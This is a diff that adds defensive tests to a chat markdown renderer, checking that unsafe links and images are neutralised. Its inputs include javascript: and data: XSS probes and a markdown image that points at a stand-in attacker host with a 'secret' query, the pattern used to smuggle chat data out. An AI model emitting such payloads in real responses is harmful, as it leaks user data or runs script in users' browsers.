@@ -23,6 +23,74 @@ describe("ChatMarkdown", () => {
     expect(html).not.toContain("javascript:");
   });
 
+  it("renders unsafe links as plain text instead of a link back into the app", () => {
+    const html = renderToStaticMarkup(
+      <ChatMarkdown>
+        {"[x](javascript:alert(1)) [d](data:text/html,hi) [ok](https://example.test)"}
+      </ChatMarkdown>,
+    );
+
+    expect(html).not.toContain('href=""');
+    expect(html).toContain("<span>x</span>");
+    expect(html).toContain("<span>d</span>");
+    expect(html).toContain('<a href="https://example.test" target="_blank"');
+  });
+
+  it("shows remote markdown images as links and relative ones as text, without loading them", () => {
+    const html = renderToStaticMarkup(
+      <ChatMarkdown>
+        {
+          '![chart](https://attacker.example.test/p.gif?d=secret "Q3 revenue") ![logo](/api/v1/p.gif) ![](./p.gif)'
+        }
+      </ChatMarkdown>,
+    );
+
+    expect(html).not.toContain("<img");
+    expect(html).toContain(
+      '<a href="https://attacker.example.test/p.gif?d=secret" title="Q3 revenue" target="_blank" rel="noreferrer noopener">chart</a>',
+    );
+    expect(html).not.toContain('href="/api/v1/p.gif"');
+    expect(html).not.toContain('href="./p.gif"');
+    expect(html).toContain("logo");
+    expect(html).toContain("./p.gif");
+  });
+
+  it("never puts an unsafe image source into an attribute", () => {
+    const html = renderToStaticMarkup(
+      <ChatMarkdown>
+        {"![x](javascript:alert(1)) ![](data:text/html,hi) ![p](//attacker.example.test/p.gif)"}
+      </ChatMarkdown>,
+    );
+
+    expect(html).not.toContain("<img");
+    expect(html).not.toContain("<a");
+    expect(html).not.toMatch(/(src|href)="(javascript:|data:|\/\/)/);
+    expect(html).toContain("x");
+    expect(html).toContain("p");
+  });
+
+  it("keeps an image inside a link as that link's text", () => {
+    const html = renderToStaticMarkup(
+      <ChatMarkdown>
+        {"[![build](https://badge.example.test/b.svg)](https://ci.example.test/run)"}
+      </ChatMarkdown>,
+    );
+
+    expect(html).not.toContain("<img");
+    expect(html).not.toContain("badge.example.test");
+    expect(html).toContain(
+      '<a href="https://ci.example.test/run" target="_blank" rel="noreferrer noopener">build</a>',
+    );
+  });
+
+  it("renders embedded image data inline", () => {
+    const html = renderToStaticMarkup(
+      <ChatMarkdown>{"![dot](data:image/png;base64,iVBORw0KGgo=)"}</ChatMarkdown>,
+    );
+
+    expect(html).toContain('<img src="data:image/png;base64,iVBORw0KGgo=" alt="dot"');
+  });
+
   it("renders incomplete streaming code fences as code", () => {
     const html = renderToStaticMarkup(
       <ChatMarkdown streaming>{"```ts\nconst live = true;"}</ChatMarkdown>,
